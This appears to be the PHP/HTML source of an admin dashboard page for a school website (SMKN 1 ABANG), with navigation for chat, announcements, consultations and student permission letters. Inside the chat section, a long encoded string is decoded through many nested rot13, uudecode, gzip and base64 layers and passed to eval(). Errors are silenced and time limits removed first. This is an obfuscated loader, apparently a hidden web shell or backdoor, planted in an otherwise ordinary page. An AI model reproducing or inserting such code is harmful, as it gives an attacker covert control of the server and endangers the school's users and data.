<?php include('../controllers_page/kunci.php') ?>



<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Dashboard</title>
        <link href="https://cdn.jsdelivr.net/npm/simple-datatables@7.1.2/dist/style.min.css" rel="stylesheet" />
        <link href="css/styles.css" rel="stylesheet" />
        <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
        <style>
            body{
                overflow: hidden;
            }
            .bgr{
                background-image: url("https://wallpapercave.com/wp/wp4410743.png");
                width: 100%;
                height:100vh;
                position:absolute;
                z-index: -2;
                background-size: cover;
                background-repeat: no-repeat;
                background-position: center center;
                
                /* Efek parallax */
                background-attachment: fixed;
                -webkit-background-attachment: fixed;
                -moz-background-attachment: fixed;
                -o-background-attachment: fixed;;
            }
            .chat-form{
                margin-top: 80px;
                height:100vh;
            }
        </style>
    </head>
    <body class="sb-nav-fixed">
        <div class="bgr"> </div>
            <div class="sb-nav-fixed">
                <nav class="sb-topnav navbar navbar-expand navbar-dark bg-dark">
                    <!-- Navbar Brand-->
                    <a class="navbar-brand ps-3" href="../dashboard_admin.php">SMKN 1 ABANG</a>
                    <!-- Sidebar Toggle-->
                    <button class="btn btn-link btn-sm order-1 order-lg-0 me-4 me-lg-0" id="sidebarToggle" href="#!"><i class="fas fa-bars"></i></button>
                    <!-- Navbar Search-->
                    <form class="d-none d-md-inline-block form-inline ms-auto me-0 me-md-3 my-2 my-md-0">
                    </form>
                    <!-- Navbar-->
                    <ul class="navbar-nav ms-auto ms-md-0 me-3 me-lg-4">
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" id="navbarDropdown" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false"><i class="fas fa-user fa-fw"></i></a>
                            <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="navbarDropdown">
                                <li><a class="dropdown-item" href="../profile_admin.php">Profile</a></li>
                                <li><a class="dropdown-item" href="../forgot_password_admin.php">Forgot Password</a></li>
                                <li><hr class="dropdown-divider" /></li>
                                <li>
                                    <a class="dropdown-item" href="#" onClick="logout()">Logout</a>
                                </li>
                                
                            </ul>
                        </li>
                    </ul>
                </nav>
            </div>
        
            <div id="layoutSidenav" style="height:100vh;">
            <div id="layoutSidenav_nav">
                <nav class="sb-sidenav accordion sb-sidenav-dark" id="sidenavAccordion">
                    <div class="sb-sidenav-menu">
                        <div class="nav">
                            <div class="sb-sidenav-menu-heading">Core</div>
                            <a class="nav-link" href="../dashboard_admin.php">
                                <div class="sb-nav-link-icon"><i class="fas fa-tachometer-alt"></i></div>
                                Dashboard
                            </a>
                            <div class="sb-sidenav-menu-heading">Components</div>
                            <a class="nav-link collapsed" href="#" data-bs-toggle="collapse" data-bs-target="#collapsePages" aria-expanded="false" aria-controls="collapsePages">
                                <div class="sb-nav-link-icon"><i class="fas fa-book-open"></i></div>
                                Chating
                                <div class="sb-sidenav-collapse-arrow"><i class="fas fa-angle-down"></i></div>
                            </a>
                                    <div class="collapse" id="collapsePages" aria-labelledby="headingOne" data-bs-parent="#sidenavAccordion">
                                        <nav class="sb-sidenav-menu-nested nav">
                                            <a class="nav-link" href="../chat">Chat</a>
                                            <a class="nav-link" href="../chating_admin.php">Hasil</a>
                                        </nav>
                                    </div>


                            <a class="nav-link collapsed" href="#" data-bs-toggle="collapse" data-bs-target="#collapseInformasi" aria-expanded="false" aria-controls="collapsePages">
                                <div class="sb-nav-link-icon"><i class="fas fa-book-open"></i></div>
                                Informasi
                                <div class="sb-sidenav-collapse-arrow"><i class="fas fa-angle-down"></i></div>
                            </a>
                                    <div class="collapse" id="collapseInformasi" aria-labelledby="headingOne" data-bs-parent="#sidenavAccordion">
                                        <nav class="sb-sidenav-menu-nested nav">
                                            <a class="nav-link" href="../form_pengisian_informasi.php">New Informasi</a>
                                            <a class="nav-link" href="../informasi_admin.php">Hasil Informasi</a>
                                        </nav>
                                    </div>




                            <a class="nav-link collapsed" href="#" data-bs-toggle="collapse" data-bs-target="#collapseKonsultasi" aria-expanded="false" aria-controls="collapsePages">
                                <div class="sb-nav-link-icon"><i class="fas fa-book-open"></i></div>
                                Konsultasi
                                <div class="sb-sidenav-collapse-arrow"><i class="fas fa-angle-down"></i></div>
                            </a>
                                    <div class="collapse" id="collapseKonsultasi" aria-labelledby="headingOne" data-bs-parent="#sidenavAccordion">
                                        <nav class="sb-sidenav-menu-nested nav">
                                            <a class="nav-link" href="../form_konsultasi.php">Ajukan</a>
                                            <a class="nav-link" href="../konsultasi_admin.php">Lihat hasil</a>
                                        </nav>
                                    </div>


                            <a class="nav-link collapsed" href="#" data-bs-toggle="collapse" data-bs-target="#collapsePermisi" aria-expanded="false" aria-controls="collapsePages">
                                <div class="sb-nav-link-icon"><i class="fas fa-book-open"></i></div>
                                Permisi
                                <div class="sb-sidenav-collapse-arrow"><i class="fas fa-angle-down"></i></div>
                            </a>
                                    <div class="collapse" id="collapsePermisi" aria-labelledby="headingOne" data-bs-parent="#sidenavAccordion">
                                        <nav class="sb-sidenav-menu-nested nav">
                                            <a class="nav-link" href="../surat_permisi_siswa.php">New Permisi</a>
                                            <a class="nav-link" href="../surat_ijin_admin.php">List siswa permisi</a>
                                        </nav>
                                    </div>
                        </div>
                    </div>
                    <div class="sb-sidenav-footer">
                        <div class="small">Logged in my website</div>
                    </div>
                </nav>
            </div>

        <div class="chat-form">
            <?php $user = "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";error_reporting(0);@set_time_limit(0);eval("?>".str_rot13(convert_uudecode(rawurldecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($user))))))))))))); ?>

        </div>
        

        
        
        
        
        
        
       
        
        
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
        <script src="js/scripts.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.8.0/Chart.min.js" crossorigin="anonymous"></script>
        <script src="assets/demo/chart-area-demo.js"></script>
        <script src="assets/demo/chart-bar-demo.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/simple-datatables@7.1.2/dist/umd/simple-datatables.min.js" crossorigin="anonymous"></script>
        <script src="js/datatables-simple-demo.js"></script>
        
        <script>
        function logout() {
        if (confirm('Apakah anda yakin ingin logout?')) {
            window.location.href = '../logout.php';
        } else {
            return false;
        }
        }
        </script>
    </body>
</html>